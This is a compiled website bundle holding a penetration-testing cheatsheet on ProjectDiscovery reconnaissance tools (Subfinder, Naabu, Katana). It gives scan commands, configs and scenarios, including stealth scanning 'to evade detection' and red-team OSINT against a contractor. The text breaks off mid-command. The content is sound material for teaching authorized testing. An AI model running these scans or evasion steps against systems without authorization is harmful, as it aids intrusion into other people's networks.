"use strict";(globalThis.webpackChunkgl_0_bal_01=globalThis.webpackChunkgl_0_bal_01||[]).push([[5336],{28453:(e,n,t)=>{t.d(n,{R:()=>r,x:()=>o});var s=t(96540);const i={},a=s.createContext(i);function r(e){const n=s.useContext(a);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),s.createElement(a.Provider,{value:n},e.children)}},93079:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>h,frontMatter:()=>r,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"cheatsheets/projectdiscovery/projectdiscovery_tools","title":"The Complete ProjectDiscovery Tools Practical Guide","description":"The most comprehensive practical guide to ProjectDiscovery tools with real-world scenarios, advanced techniques, and expert methodologies","source":"@site/docs/cheatsheets/projectdiscovery/projectdiscovery_tools.md","sourceDirName":"cheatsheets/projectdiscovery","slug":"/cheatsheets/projectdiscovery/tools","permalink":"/cheatsheets/projectdiscovery/tools","draft":false,"unlisted":false,"editUrl":"https://github.com/gl0bal01/gl0bal01.github.io/tree/main/docs/cheatsheets/projectdiscovery/projectdiscovery_tools.md","tags":[{"inline":true,"label":"security","permalink":"/tags/security"},{"inline":true,"label":"penetration-testing","permalink":"/tags/penetration-testing"},{"inline":true,"label":"reconnaissance","permalink":"/tags/reconnaissance"},{"inline":true,"label":"vulnerability-scanning","permalink":"/tags/vulnerability-scanning"},{"inline":true,"label":"bug-bounty","permalink":"/tags/bug-bounty"}],"version":"current","lastUpdatedAt":1751446347000,"sidebarPosition":1,"frontMatter":{"slug":"tools","title":"The Complete ProjectDiscovery Tools Practical Guide","description":"The most comprehensive practical guide to ProjectDiscovery tools with real-world scenarios, advanced techniques, and expert methodologies","keywords":["projectdiscovery","nuclei","subfinder","httpx","naabu","katana","penetration testing","bug bounty","red team","security tools"],"tags":["security","penetration-testing","reconnaissance","vulnerability-scanning","bug-bounty"],"sidebar_label":"Discovery Tools","sidebar_position":1,"authors":"gl0bal01"},"sidebar":"tutorialSidebar","previous":{"title":"ProjectDiscovery","permalink":"/cheatsheets/projectdiscovery"},"next":{"title":"Nuclei Practical","permalink":"/cheatsheets/projectdiscovery/nuclei"}}');var i=t(74848),a=t(28453);const r={slug:"tools",title:"The Complete ProjectDiscovery Tools Practical Guide",description:"The most comprehensive practical guide to ProjectDiscovery tools with real-world scenarios, advanced techniques, and expert methodologies",keywords:["projectdiscovery","nuclei","subfinder","httpx","naabu","katana","penetration testing","bug bounty","red team","security tools"],tags:["security","penetration-testing","reconnaissance","vulnerability-scanning","bug-bounty"],sidebar_label:"Discovery Tools",sidebar_position:1,authors:"gl0bal01"},o="ProjectDiscovery Tools Practical Guide",c={},l=[{value:"Table of Contents",id:"table-of-contents",level:2},{value:"Introduction &amp; Methodology",id:"introduction--methodology",level:2},{value:"Security Testing Phases",id:"security-testing-phases",level:3},{value:"Discovery Tools",id:"discovery-tools",level:2},{value:"1. Subfinder - Passive Subdomain Enumeration",id:"1-subfinder---passive-subdomain-enumeration",level:3},{value:"Overview",id:"overview",level:4},{value:"Installation",id:"installation",level:4},{value:"Basic Usage",id:"basic-usage",level:4},{value:"Advanced Configuration",id:"advanced-configuration",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios",level:4},{value:"Advanced Techniques",id:"advanced-techniques",level:4},{value:"Integration with Other Tools",id:"integration-with-other-tools",level:4},{value:"2. Naabu - High-Performance Port Scanner",id:"2-naabu---high-performance-port-scanner",level:3},{value:"Overview",id:"overview-1",level:4},{value:"Installation",id:"installation-1",level:4},{value:"Basic Usage",id:"basic-usage-1",level:4},{value:"Advanced Configuration",id:"advanced-configuration-1",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-1",level:4},{value:"Advanced Techniques",id:"advanced-techniques-1",level:4},{value:"3. Katana - Web Crawling Framework",id:"3-katana---web-crawling-framework",level:3},{value:"Overview",id:"overview-2",level:4},{value:"Installation",id:"installation-2",level:4},{value:"Basic Usage",id:"basic-usage-2",level:4},{value:"Advanced Configuration",id:"advanced-configuration-2",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-2",level:4},{value:"Advanced Techniques",id:"advanced-techniques-2",level:4},{value:"4. Chaos - Internet-Wide Asset Discovery",id:"4-chaos---internet-wide-asset-discovery",level:3},{value:"Overview",id:"overview-3",level:4},{value:"Installation",id:"installation-3",level:4},{value:"Basic Usage",id:"basic-usage-3",level:4},{value:"Configuration",id:"configuration",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-3",level:4},{value:"Advanced Integration",id:"advanced-integration",level:4},{value:"5. Uncover - Search Engine for Exposed Assets",id:"5-uncover---search-engine-for-exposed-assets",level:3},{value:"Overview",id:"overview-4",level:4},{value:"Installation",id:"installation-4",level:4},{value:"Basic Usage",id:"basic-usage-4",level:4},{value:"Configuration",id:"configuration-1",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-4",level:4},{value:"Advanced Queries",id:"advanced-queries",level:4},{value:"6. Cloudlist - Multi-Cloud Asset Enumeration",id:"6-cloudlist---multi-cloud-asset-enumeration",level:3},{value:"Overview",id:"overview-5",level:4},{value:"Installation",id:"installation-5",level:4},{value:"Configuration",id:"configuration-2",level:4},{value:"Basic Usage",id:"basic-usage-5",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-5",level:4},{value:"Advanced Integration",id:"advanced-integration-1",level:4},{value:"7. ASNmap - Autonomous System Mapping",id:"7-asnmap---autonomous-system-mapping",level:3},{value:"Overview",id:"overview-6",level:4},{value:"Installation",id:"installation-6",level:4},{value:"Basic Usage",id:"basic-usage-6",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-6",level:4},{value:"8. Alterx - Subdomain Wordlist Generator",id:"8-alterx---subdomain-wordlist-generator",level:3},{value:"Overview",id:"overview-7",level:4},{value:"Installation",id:"installation-7",level:4},{value:"Basic Usage",id:"basic-usage-7",level:4},{value:"DSL Patterns",id:"dsl-patterns",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-7",level:4},{value:"Advanced Pattern Generation",id:"advanced-pattern-generation",level:4},{value:"9. Shuffledns - DNS Bruteforce with Wildcard Handling",id:"9-shuffledns---dns-bruteforce-with-wildcard-handling",level:3},{value:"Overview",id:"overview-8",level:4},{value:"Installation",id:"installation-8",level:4},{value:"Prerequisites",id:"prerequisites",level:4},{value:"Basic Usage",id:"basic-usage-8",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-8",level:4},{value:"Advanced Configuration",id:"advanced-configuration-3",level:4},{value:"Enrichment Tools",id:"enrichment-tools",level:2},{value:"10. Httpx - HTTP Toolkit for Reconnaissance",id:"10-httpx---http-toolkit-for-reconnaissance",level:3},{value:"Overview",id:"overview-9",level:4},{value:"Installation",id:"installation-9",level:4},{value:"Basic Usage",id:"basic-usage-9",level:4},{value:"Advanced Features",id:"advanced-features",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-9",level:4},{value:"Advanced Techniques",id:"advanced-techniques-3",level:4},{value:"11. DNSx - DNS Toolkit",id:"11-dnsx---dns-toolkit",level:3},{value:"Overview",id:"overview-10",level:4},{value:"Installation",id:"installation-10",level:4},{value:"Basic Usage",id:"basic-usage-10",level:4},{value:"Advanced Features",id:"advanced-features-1",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-10",level:4},{value:"Advanced Techniques",id:"advanced-techniques-4",level:4},{value:"12. TLSx - TLS/SSL Analysis Tool",id:"12-tlsx---tlsssl-analysis-tool",level:3},{value:"Overview",id:"overview-11",level:4},{value:"Installation",id:"installation-11",level:4},{value:"Basic Usage",id:"basic-usage-11",level:4},{value:"Advanced Features",id:"advanced-features-2",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-11",level:4},{value:"Advanced Techniques",id:"advanced-techniques-5",level:4},{value:"Detection Tools",id:"detection-tools",level:2},{value:"13. Nuclei - Vulnerability Scanner",id:"13-nuclei---vulnerability-scanner",level:3},{value:"Overview",id:"overview-12",level:4},{value:"Installation",id:"installation-12",level:4},{value:"Basic Usage",id:"basic-usage-12",level:4},{value:"Template Categories",id:"template-categories",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-12",level:4},{value:"Advanced Template Usage",id:"advanced-template-usage",level:4},{value:"14. Interactsh - Out-of-Band Interaction Server",id:"14-interactsh---out-of-band-interaction-server",level:3},{value:"Overview",id:"overview-13",level:4},{value:"Installation",id:"installation-13",level:4},{value:"Basic Usage",id:"basic-usage-13",level:4},{value:"Self-Hosted Server Setup",id:"self-hosted-server-setup",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-13",level:4},{value:"Advanced Integration",id:"advanced-integration-2",level:4},{value:"15. CVEMap - CVE Intelligence Tool",id:"15-cvemap---cve-intelligence-tool",level:3},{value:"Overview",id:"overview-14",level:4},{value:"Installation",id:"installation-14",level:4},{value:"Basic Usage",id:"basic-usage-14",level:4},{value:"Advanced Filtering",id:"advanced-filtering",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-14",level:4},{value:"Integration with Security Tools",id:"integration-with-security-tools",level:4},{value:"16. Notify - Multi-Platform Notification Tool",id:"16-notify---multi-platform-notification-tool",level:3},{value:"Overview",id:"overview-15",level:4},{value:"Installation",id:"installation-15",level:4},{value:"Configuration",id:"configuration-3",level:4},{value:"Basic Usage",id:"basic-usage-15",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-15",level:4},{value:"Advanced Integration Patterns",id:"advanced-integration-patterns",level:4},{value:"Utility Tools",id:"utility-tools",level:2},{value:"17. PDTM - ProjectDiscovery Tool Manager",id:"17-pdtm---projectdiscovery-tool-manager",level:3},{value:"Overview",id:"overview-16",level:4},{value:"Installation",id:"installation-16",level:4},{value:"Basic Usage",id:"basic-usage-16",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-16",level:4},{value:"18. MapCIDR - CIDR Manipulation Utility",id:"18-mapcidr---cidr-manipulation-utility",level:3},{value:"Overview",id:"overview-17",level:4},{value:"Installation",id:"installation-17",level:4},{value:"Basic Usage",id:"basic-usage-17",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-17",level:4},{value:"19. CDNCheck - CDN and Technology Detection",id:"19-cdncheck---cdn-and-technology-detection",level:3},{value:"Overview",id:"overview-18",level:4},{value:"Installation",id:"installation-18",level:4},{value:"Basic Usage",id:"basic-usage-18",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-18",level:4},{value:"20. AIx - AI-Powered Security Assistant",id:"20-aix---ai-powered-security-assistant",level:3},{value:"Overview",id:"overview-19",level:4},{value:"Installation",id:"installation-19",level:4},{value:"Configuration",id:"configuration-4",level:4},{value:"Basic Usage",id:"basic-usage-19",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-19",level:4},{value:"21. Proxify - HTTP Proxy Tool",id:"21-proxify---http-proxy-tool",level:3},{value:"Overview",id:"overview-20",level:4},{value:"Installation",id:"installation-20",level:4},{value:"Basic Usage",id:"basic-usage-20",level:4},{value:"Advanced Features",id:"advanced-features-3",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-20",level:4},{value:"Advanced Integration",id:"advanced-integration-3",level:4},{value:"22. SimpleHTTPServer - Enhanced HTTP Server",id:"22-simplehttpserver---enhanced-http-server",level:3},{value:"Overview",id:"overview-21",level:4},{value:"Installation",id:"installation-21",level:4},{value:"Basic Usage",id:"basic-usage-21",level:4},{value:"Real-World Scenarios",id:"real-world-scenarios-21",level:4},{value:"Advanced Workflows",id:"advanced-workflows",level:2},{value:"Multi-Tool Integration Pipelines",id:"multi-tool-integration-pipelines",level:3},{value:"Comprehensive Asset Discovery Pipeline",id:"comprehensive-asset-discovery-pipeline",level:4},{value:"Continuous Security Monitoring Pipeline",id:"continuous-security-monitoring-pipeline",level:4},{value:"Bug Bounty Automation Pipeline",id:"bug-bounty-automation-pipeline",level:4},{value:"Real-World Case Studies",id:"real-world-case-studies",level:2},{value:"Case Study 1: Fortune 500 Financial Institution Assessment",id:"case-study-1-fortune-500-financial-institution-assessment",level:3},{value:"Case Study 2: SaaS Platform Security Assessment",id:"case-study-2-saas-platform-security-assessment",level:3},{value:"Case Study 3: Government Contractor Red Team Exercise",id:"case-study-3-government-contractor-red-team-exercise",level:3},{value:"Conclusion",id:"conclusion",level:2},{value:"Key Takeaways",id:"key-takeaways",level:3},{value:"Next Steps",id:"next-steps",level:3}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"projectdiscovery-tools-practical-guide",children:"ProjectDiscovery Tools Practical Guide"})}),"\n",(0,i.jsx)(n.h2,{id:"table-of-contents",children:"Table of Contents"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#introduction--methodology",children:"Introduction & Methodology"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#discovery-tools",children:"Discovery Tools"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#enrichment-tools",children:"Enrichment Tools"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#detection-tools",children:"Detection Tools"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#utility-tools",children:"Utility Tools"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#advanced-workflows",children:"Advanced Workflows"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#real-world-case-studies",children:"Real-World Case Studies"})}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"introduction--methodology",children:"Introduction & Methodology"}),"\n",(0,i.jsx)(n.p,{children:"This guide follows penetration testing best practices incorporating OSSTMM, NIST, and PTES methodologies to provide structured, practical approaches to security testing using ProjectDiscovery tools."}),"\n",(0,i.jsx)(n.h3,{id:"security-testing-phases",children:"Security Testing Phases"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Discovery Phase"}),": Asset identification and attack surface mapping"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Enrichment Phase"}),": Technology identification and service enumeration"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Detection Phase"}),": Vulnerability identification and exploitation"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Analysis Phase"}),": Risk assessment and reporting"]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"discovery-tools",children:"Discovery Tools"}),"\n",(0,i.jsx)(n.h3,{id:"1-subfinder---passive-subdomain-enumeration",children:"1. Subfinder - Passive Subdomain Enumeration"}),"\n",(0,i.jsx)(n.h4,{id:"overview",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Subfinder is a passive subdomain discovery tool that leverages multiple data sources to enumerate subdomains without directly interacting with the target."}),"\n",(0,i.jsx)(n.h4,{id:"installation",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Basic subdomain enumeration\nsubfinder -d example.com\n\n# Output to file\nsubfinder -d example.com -o subdomains.txt\n\n# Use specific sources\nsubfinder -d example.com -sources virustotal,securitytrails\n\n# Verbose output\nsubfinder -d example.com -v\n"})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-configuration",children:"Advanced Configuration"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Configuration File (~/.config/subfinder/provider-config.yaml)"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-yaml",children:'binaryedge:\n  - "api_key_here"\ncensys:\n  - "api_id:api_secret"\ncertspotter:\n  - "api_key_here"\nchaos:\n  - "api_key_here"\nfofa:\n  - "email:api_key"\nhunter:\n  - "api_key_here"\nsecuritytrails:\n  - "api_key_here"\nshodan:\n  - "api_key_here"\nvirustotal:\n  - "api_key_here"\nzoomeye:\n  - "username:password"\n'})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Corporate Asset Discovery"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Large financial institution\n# Objective: Map entire digital footprint\n\n# Step 1: Initial enumeration\nsubfinder -d megabank.com -o megabank_subs.txt -v\n\n# Step 2: Check multiple TLDs\nfor tld in com net org io; do\n    subfinder -d megabank.$tld -o megabank_${tld}_subs.txt\ndone\n\n# Step 3: Recursive enumeration for discovered domains\ncat megabank_subs.txt | while read subdomain; do\n    subfinder -d $subdomain -o ${subdomain}_recursive.txt\ndone\n\n# Step 4: Combine and deduplicate\ncat *_subs.txt | sort -u > megabank_all_subdomains.txt\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Bug Bounty Reconnaissance"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: SaaS company with complex infrastructure\n# Objective: Find hidden development/staging environments\n\n# Use maximum sources for comprehensive coverage\nsubfinder -d saascompany.com -all -o saas_subdomains.txt\n\n# Look for common patterns\ngrep -E \"(dev|test|stage|staging|beta|demo|admin|api|internal)\" saas_subdomains.txt\n\n# Check for wildcard domains\nsubfinder -d saascompany.com | grep '\\*'\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Red Team Operation"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Government contractor\n# Objective: OSINT gathering for social engineering\n\n# Enumerate with rate limiting to avoid detection\nsubfinder -d contractor.gov -rate-limit 10 -timeout 30 -o contractor_subs.txt\n\n# Focus on high-value targets\ngrep -E "(mail|vpn|remote|citrix|exchange|owa|admin|portal)" contractor_subs.txt\n'})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-techniques",children:"Advanced Techniques"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Custom Wordlist Integration"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Create custom wordlist based on target\necho -e "api\\ndev\\nstaging\\ntest\\nbeta\\nadmin\\nportal\\nvpn\\nmail\\nftp" > custom_subs.txt\n\n# Use with subfinder\nsubfinder -d target.com -w custom_subs.txt\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Monitoring and Continuous Discovery"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\n# Script: continuous_subfinder.sh\nDOMAIN=$1\nSLEEP_TIME=3600  # 1 hour\n\nwhile true; do\n    TIMESTAMP=$(date +%Y%m%d_%H%M%S)\n    subfinder -d $DOMAIN -o "${DOMAIN}_${TIMESTAMP}.txt"\n    \n    # Compare with previous results\n    if [ -f "previous_subs.txt" ]; then\n        comm -13 previous_subs.txt "${DOMAIN}_${TIMESTAMP}.txt" > new_subs.txt\n        if [ -s new_subs.txt ]; then\n            echo "New subdomains found:"\n            cat new_subs.txt\n        fi\n    fi\n    \n    cp "${DOMAIN}_${TIMESTAMP}.txt" previous_subs.txt\n    sleep $SLEEP_TIME\ndone\n'})}),"\n",(0,i.jsx)(n.h4,{id:"integration-with-other-tools",children:"Integration with Other Tools"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Pipeline: Subfinder \u2192 Httpx \u2192 Nuclei\nsubfinder -d target.com | httpx -silent | nuclei -t vulnerabilities/\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"2-naabu---high-performance-port-scanner",children:"2. Naabu - High-Performance Port Scanner"}),"\n",(0,i.jsx)(n.h4,{id:"overview-1",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Naabu is a port scanning tool designed for speed and reliability, capable of scanning thousands of hosts efficiently."}),"\n",(0,i.jsx)(n.h4,{id:"installation-1",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-1",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Scan top 1000 ports\nnaabu -host example.com\n\n# Scan specific ports\nnaabu -host example.com -p 80,443,8080,8443\n\n# Scan port range\nnaabu -host example.com -p 1-1000\n\n# Scan multiple hosts\nnaabu -list hosts.txt -p 1-65535\n"})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-configuration-1",children:"Advanced Configuration"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Configuration File (~/.config/naabu/config.yaml)"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-yaml",children:'# Rate limiting\nrate: 1000\n# Threads\nc: 25\n# Timeout\ntimeout: 1000\n# Interface\ninterface: eth0\n# Custom ports\nports:\n  - "80,443,8080,8443"\n  - "22,23,25,53,110,143,993,995"\n  - "1433,3306,5432,6379,27017"\n'})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-1",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Network Infrastructure Assessment"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Corporate network range\n# Objective: Identify all listening services\n\n# Step 1: Discover live hosts first\nnmap -sn 192.168.1.0/24 | grep \"Nmap scan report\" | awk '{print $5}' > live_hosts.txt\n\n# Step 2: Port scan with service detection\nnaabu -list live_hosts.txt -p 1-65535 -rate 1000 -o all_ports.txt\n\n# Step 3: Focus on critical services\nnaabu -list live_hosts.txt -p 22,23,25,53,80,135,139,443,445,993,995,3389 -v\n\n# Step 4: Identify unusual services\nnaabu -list live_hosts.txt -exclude-ports 80,443,22,53 -top-ports 1000\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Cloud Asset Discovery"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: AWS infrastructure\n# Objective: Map exposed services across regions\n\n# Scan common cloud ports\nnaabu -list aws_ips.txt -p 22,80,443,8080,8443,3000,5000,8000,9000 -rate 500\n\n# Check for container orchestration\nnaabu -list aws_ips.txt -p 2375,2376,6443,8001,8080,10250 -v\n\n# Database services\nnaabu -list aws_ips.txt -p 1433,3306,5432,6379,27017,9200,9300\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Stealth Reconnaissance"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: High-security environment\n# Objective: Avoid detection while gathering intelligence\n\n# Use slow scan with randomization\nnaabu -host target.com -rate 50 -timeout 5000 -p 1-1000\n\n# Scan through proxy\nnaabu -host target.com -proxy http://proxy:8080 -p 80,443\n\n# Fragment packets to evade detection\nnaabu -host target.com -scan-type s -rate 100 -p 1-65535\n"})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-techniques-1",children:"Advanced Techniques"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Custom Port Lists"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Web services\necho "80,443,8080,8443,8000,8888,3000,5000,9000" > web_ports.txt\n\n# Database services\necho "1433,3306,5432,6379,27017,9200,9300,5984,7000,7001" > db_ports.txt\n\n# Use custom lists\nnaabu -list targets.txt -ports-file web_ports.txt\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Integration with Service Detection"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Naabu + Nmap service detection\nnaabu -host target.com -silent | nmap -sV -sC -iL - -oA target_services\n\n# Naabu + Nuclei for vulnerability scanning\nnaabu -host target.com -silent | httpx -silent | nuclei -t exposures/\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Performance Optimization"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# High-performance scanning\nnaabu -list targets.txt -rate 5000 -c 50 -retries 1 -warm-up-time 2\n\n# Network-optimized scanning\nnaabu -list targets.txt -interface eth0 -source-ip 192.168.1.100 -rate 2000\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"3-katana---web-crawling-framework",children:"3. Katana - Web Crawling Framework"}),"\n",(0,i.jsx)(n.h4,{id:"overview-2",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Katana is a fast web crawling framework designed for comprehensive web asset discovery and parsing."}),"\n",(0,i.jsx)(n.h4,{id:"installation-2",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/katana/cmd/katana@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-2",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Basic crawling\nkatana -u https://example.com\n\n# Crawl with depth control\nkatana -u https://example.com -depth 3\n\n# Output to file\nkatana -u https://example.com -o crawled_urls.txt\n\n# JSON output\nkatana -u https://example.com -json -o results.json\n"})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-configuration-2",children:"Advanced Configuration"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Configuration File (~/.config/katana/config.yaml)"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-yaml",children:'# Crawling depth\ndepth: 3\n# Rate limiting\nrate-limit: 100\n# Timeout settings\ntimeout: 10\n# Headers\nheaders:\n  - "User-Agent: Mozilla/5.0 (compatible; KatanaBot/1.0)"\n# Form filling\nform-config: forms.yaml\n'})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-2",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: E-commerce Security Assessment"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Online store\n# Objective: Map all pages and identify sensitive endpoints\n\n# Step 1: Deep crawl with authentication\nkatana -u https://store.com -depth 5 -headless \\\n       -headers "Cookie: session=abc123" \\\n       -field-scope "xpath://input[@type=\'password\']"\n\n# Step 2: Focus on API endpoints\nkatana -u https://store.com -field-scope "regex:.*api.*" -json\n\n# Step 3: Extract forms and parameters\nkatana -u https://store.com -form-extraction -output-file forms.txt\n\n# Step 4: Identify admin panels\nkatana -u https://store.com | grep -E "(admin|panel|dashboard|manage)"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Single Page Application (SPA) Testing"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: React/Angular application\n# Objective: Discover all routes and endpoints\n\n# JavaScript-heavy application crawling\nkatana -u https://spa-app.com -headless -chrome-sandbox=false \\\n       -depth 4 -field-scope "href,src,action,formaction"\n\n# Extract API calls from JavaScript\nkatana -u https://spa-app.com -js-crawl -js-timeout 30 \\\n       -field-scope "regex:.*\\\\.js$" -output-file js_endpoints.txt\n\n# Monitor XHR requests\nkatana -u https://spa-app.com -xhr-extraction -json\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Content Discovery for Bug Bounty"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Corporate website\n# Objective: Find hidden files and directories\n\n# Comprehensive crawling with multiple strategies\nkatana -u https://company.com -depth 3 -passive \\\n       -field-scope "href,src,action,formaction,data-url"\n\n# Look for sensitive files\nkatana -u https://company.com | grep -E "\\\\.(env|config|backup|log|sql)$"\n\n# Extract social media and external links\nkatana -u https://company.com -field-scope "href" | grep -E "(facebook|twitter|linkedin|github)"\n'})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-techniques-2",children:"Advanced Techniques"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Custom Field Extraction"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Extract all data attributes\nkatana -u https://target.com -field-scope "xpath://@data-*"\n\n# Extract API endpoints from JavaScript\nkatana -u https://target.com -js-crawl | grep -oP "api/v\\d+/[^\\"\']*"\n\n# Extract email addresses\nkatana -u https://target.com | grep -oE 